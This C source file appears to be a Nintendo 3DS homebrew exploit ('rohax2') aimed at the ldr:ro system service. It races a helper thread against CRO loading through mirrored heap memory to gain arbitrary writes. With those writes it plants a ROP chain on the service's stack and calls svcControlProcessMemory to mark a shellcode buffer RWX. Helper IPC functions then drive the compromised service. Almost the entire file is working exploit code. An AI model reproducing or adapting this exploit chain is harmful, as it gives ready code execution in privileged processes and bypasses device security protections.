#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <malloc.h>

#include "ro.h"
#include "heaphax.h"
#include "ro_constants.h"
#include "ro_command_handler_bin.h"

void* crr_bin;
int crr_bin_size;
void* crs_bin;
int crs_bin_size;

typedef struct
{
	Handle event;
	volatile u32* target;
	volatile u8* fail_target;
	u32 address;
	u32 num;
	u32 delay;
}raceParameters_s;

void raceThread(volatile raceParameters_s* rp)
{
	while(1)
	{
		svcWaitSynchronization(rp->event, -1);
		volatile u32* target = rp->target;
		volatile u32* fail_target = (volatile u32*)rp->fail_target;
		if(target)
		{
			while(*target == 0x1db004);
			volatile int i;
			for(i = 0; i < rp->delay; i++);
			// setup write primitive
			target[0] = rp->address;
			target[1] = rp->num;
			// setup fast fail path after write
			if(fail_target) *fail_target = 0x01;
			svcClearEvent(rp->event);
		}
	}

	svcExitThread();
}

Handle roHandle = 0;
u32 *crs_buf, *crs_mirror, *crr_buf, *crr_mirror;
u32 *cro_buf, *cro_mirror, *cro_orig;
u32 cro_size = 0;

raceParameters_s raceparam = {0};

void setupRoWrites()
{
	crs_buf = memalign(0x1000, crs_bin_size);
	memcpy(crs_buf, crs_bin, crs_bin_size);
	printf("ldr:ro handle %X\n", (unsigned int)roHandle);
	Result ret = LDRRO_Initialize(&roHandle, crs_buf, crs_bin_size, 0x02000000);
	printf("ldr:ro init %X\n", (unsigned int)ret);

	crr_buf = (u32*)0x0dead000;
	crr_mirror = NULL;
	allocateHeapHax(crr_bin_size, &crr_buf, &crr_mirror);

	if(crr_mirror)
	{
		memcpy(crr_buf, crr_bin, crr_bin_size);
		ret = LDRRO_LoadCrr(&roHandle, crr_buf, crr_bin_size);
		printf("ldr:ro crr %X\n", (unsigned int)ret);
	}

	FILE* f = fopen("sdmc:/oss.cro", "rb");
	fseek(f, 0, SEEK_END);
	cro_size = ftell(f);
	fseek(f, 0, SEEK_SET);

	cro_buf = (u32*)0x0b000000;
	cro_mirror = (u32*)0x0c000000;
	allocateHeapHax(cro_size, &cro_buf, &cro_mirror);

	cro_orig = malloc(cro_size);
	fread(cro_orig, 1, cro_size, f);
	fclose(f);

	u32* test_ptr = &cro_mirror[50];

	printf("cro %X %X %X %X\n", (unsigned int)cro_size, (unsigned int)cro_buf, (unsigned int)cro_mirror, (unsigned int)*test_ptr);
	Handle threadHandle = 0;
	u8* thread_stack = ((u8*)memalign(0x1000, 0x10000)) + 0x10000;
	raceparam = (raceParameters_s){0, test_ptr, NULL, 0, 1, 0x40};
	svcCreateEvent(&raceparam.event, 0);
	ret = svcCreateThread(&threadHandle, (ThreadFunc)raceThread, (u32)&raceparam, (u32*)thread_stack, 0x20, 0);
	printf("ldr:ro %X %X %X\n", (unsigned int)ret, (unsigned int)threadHandle, (unsigned int)thread_stack);
}

void doRoWrite(u32 address, u32 dst_address, u32 data_address, u32 bss_address, u32 num)
{
	printf("doRoWrite %08X %X %08X %08X\n", (unsigned int)address, (unsigned int)num, (unsigned int)data_address, (unsigned int)bss_address);
	Result ret = 0;
	int attempt = 0;
	if(raceparam.delay > 0x50) raceparam.delay = 0x50;
	while(1)
	{
		raceparam.address = address;
		raceparam.num = num;
		memcpy(cro_buf, cro_orig, cro_size);
		raceparam.fail_target = ((u8*)cro_mirror) + cro_mirror[56] + cro_mirror[57] - 1;
		ret = svcSignalEvent(raceparam.event);
		printf("ldr:ro %X %X ", (unsigned int)ret, (unsigned int)attempt);
		ret = LDRRO_LoadCro(&roHandle, cro_buf, cro_size, dst_address, data_address, 0xff020000, bss_address, 0xff020000);
		printf("%08X %08X %08X\r", (unsigned int)ret, (unsigned int)attempt, (unsigned int)raceparam.delay);
		attempt++;
		if(ret == 0xd9012c11) raceparam.delay++;
		else break;
	}
	printf("\n");
}

Result loadFile(char* path, void** _buffer, int* _size)
{
	FILE* f = fopen(path, "rb");

	if(!f)
	{
		printf("failed to open %s\n", path);
		return -1;
	}
	
	// get size
	fseek(f, 0, SEEK_END);
	int size = ftell(f);
	fseek(f, 0, SEEK_SET);

	// read file
	void* buffer = malloc(size);
	fread(buffer, 1, size, f);

	// close file
	fclose(f);

	// return stuff
	if(_buffer) *_buffer = buffer;
	if(_size) *_size = size;

	return 0;
}

Result rohax2()
{
	Result ret = srvGetServiceHandle(&roHandle, "ldr:ro");
	if(ret)
	{
		printf("failed to grab ldr:ro handle");
		return -1;
	}

	if((ret = loadFile("romfs:/.crr/static.crr", &crr_bin, &crr_bin_size))) return -2;
	if((ret = loadFile("romfs:/cro/static.crs", &crs_bin, &crs_bin_size))) return -3;

	setupRoWrites();

	u32* ro_rop_buffer = (u32*)0x09030000;
	u32* ro_shellcode_buf = (u32*)0x09000000;
	
	ret = svcControlMemory((u32*)&ro_rop_buffer, (u32)ro_rop_buffer, 0, 0x1000, 0x3, 0x3);
	printf("rop %x %x\n", (unsigned int)ret, (unsigned int)ro_rop_buffer);

	ret = svcControlMemory((u32*)&ro_shellcode_buf, (u32)ro_shellcode_buf, 0, 0x4000, 0x3, 0x3);
	printf("shellcode %x %x\n", (unsigned int)ret, (unsigned int)ro_shellcode_buf);

	u32* ro_rop_start = &ro_rop_buffer[1];
	u32* ro_rop_data = &ro_rop_start[5];

	memset(ro_rop_start, 0xde, 0x80);
	memset(ro_shellcode_buf, 0xda, 0x80);

	// ro_shellcode_buf[0] = 0xe59f0004;
	// ro_shellcode_buf[1] = 0xe50f000c;
	// ro_shellcode_buf[2] = 0xFFFFFFFF; // infinite loop (0xeafffffe)
	// ro_shellcode_buf[3] = 0x0000dead;
	memcpy(ro_shellcode_buf, ro_command_handler_bin, ro_command_handler_bin_size);

	// write rop
	{
		// setup r4 and r5 for the memcpy
		doRoWrite(0x0fffffae, 0x00470000, 0, 0, 1);
		doRoWrite(0x0fffffa8, 0x03000000, 0, 0x10000000 - 0x80 - 4, 1); // R4 : dst - 0x4
		doRoWrite(0x0fffffa4, 0x03000000, ro_pop_r4r5pc, 0, 1); // gadget

		// setup ret addr for memcpy
		doRoWrite(0x0fffffb6, 0x00A30000, 0, 0, 1);
		doRoWrite(0x0fffffb0, 0x03000000, 0, ro_add_r0r4x4_mov_r2x80_bl_memcpy, 1);

		// setup rop src (0x09030000)
		doRoWrite(0x0fffffa0, 0x03000000, 0, 0, 1);
		doRoWrite(0x0fffffa0, 0x03000000, 0, 0, 1);
		doRoWrite(0x0fffffa0, 0x03000000, 0, 0, 1);
	}

	// write rop
	{
		u32 rop_chain[] = {
			// implicit pop {r4, r5, r6, r7, r8, r9, r10, lr}; bx lr;
				0, // r4 : garbage
				(u32)ro_shellcode_buf, // r5 : r1, addr0
				0, // r6 : garbage
				0x1000, // r7 : r3, size
				0, // r8 : garbage
				0, // r9 : r2, addr1
				0, // r10 : garbage
				ro_pop_pc, // lr
			ro_pop_r1pc,
				0xffff8001, // r1
			ro_svc_x27_pop_r2_str_r1r2_add_spx4_bxlr,
				0x0fffffc8, // r2 : label1 address
			ro_pop_r4pc,
				0xdead, // r4 : r0, process handle (label1)
			ro_mov_r3r7_r2r9_r1r5_r0r4_bl_svcControlProcessMemory_add_spx8_mov_r0r6_pop_r4r5r6r7r8r9r10pc,
				0x6, // operation : protect
				0x7, // permissions : rwx
				0, // r4 : garbage
				0, // r5 : garbage
				0, // r6 : garbage
				0, // r7 : garbage
				0, // r8 : garbage
				0, // r9 : garbage
				0, // r10 : garbage
			(u32)ro_shellcode_buf
		};

		memcpy(ro_rop_data, rop_chain, sizeof(rop_chain));
	}

	// trigger rop
	{
		// NOTE: this technique requires that both bss and data section sizes be set to 0xff020000
		
		// 0x03 at 0x0fffffa2 (for 0x0fffff9c partial overwrite)
		doRoWrite(0x0fffff9f, 0x03000000, 0x3, 0, 1);

		// perform multi-write to overwrite both retaddr at 0x0ffffedc (to skip unmap) and 0x0fffff9c (to trigger rop)
		doRoWrite(0x0ffffedc - 0x2, 0x03000000, 0x2F9C0000, ro_pop_r1pc << 16, 0x11);
	}

	printf("value %08X\n", (unsigned int)ro_shellcode_buf[0]);

	return 0;
}

Result _HB_FlushInvalidateCache(Handle* handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00010042; //request header code
	cmdbuf[1]=0;
	cmdbuf[2]=0;
	cmdbuf[3]=0xffff8001;

	Result ret=0;
	if((ret=svcSendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result HB_ControlProcessMemory(Handle* handle, u32 addr0, u32 addr1, u32 size, u32 type, u32 permissions)
{
	if(!handle) handle = &roHandle;

	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x000A0142; //request header code
	cmdbuf[1]=addr0;
	cmdbuf[2]=addr1;
	cmdbuf[3]=size;
	cmdbuf[4]=type;
	cmdbuf[5]=permissions;
	cmdbuf[6]=0x0;
	cmdbuf[7]=0xffff8001;

	Result ret=0;
	if((ret=svcSendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}
